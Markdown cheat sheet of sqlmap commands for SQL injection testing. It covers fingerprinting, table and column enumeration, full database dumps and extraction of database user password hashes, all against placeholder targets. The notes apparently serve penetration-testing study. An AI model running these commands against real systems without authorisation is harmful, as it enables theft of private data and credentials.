
## Basic DB Data Enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# switches
`--banner`: Database version banner
`--current-user`: Current username:  
`--current-db`: Current database name
`--is-dba`: Check if the current user has DBA administrator rights
```

## Table/Row enumeration
```bash
sqlmap -u $URL --tables -D $DATABASE
```
- Retrieve all content of the table:
```bash
sqlmap -u $URL -D $DATABASE -T $TABLE --dump
```
- Row Enumeration
```bash
sqlmap -u $URL -D $DATABASE -T $TABLE -C $COL1, $COL2 --dump
```
- To specify the rows:
```bash
sqlmap -u $URL -D $DATABASE -T $TABLE -C $COL1, $COL2 --dump --start=2 --stop=5
```
- Conditional Enumeration
```bash
sqlmap -u $URL -D $DATABASE -T $TABLE --where="name LIKE 'f%'"
```

## Full DB Enumeration
- To retrieve all table in a database
```bash
sqlmap -u $URL -D $DATABASE --dump 
```
- To retrieve all the content from all the databases
```bash
sqlmap -u $URL --dump-all
```

-----------------------------
## DB SCHEMA ENUMERATION
-
```bash
sqlmap -u $URL --schema
```

- Searching for Data
```bash
sqlmap -u $URL --search -T $TABLE
```

- Search for columns
```bash
sqlmap -u $URL --search -C $COLUMN
```

## Password Enumeration and Cracking
```bash
sqlmap -u $URL --dump -D $DATABASE -T $TABLE
```

## DB Users Password Enumeration and Cracking
```bash
sqlmap -u $URL --passwords --batch 

# --all & --batch when used together will automatically do the whole enumertaion process on the target itself and provide the entire enumertaion details.
```
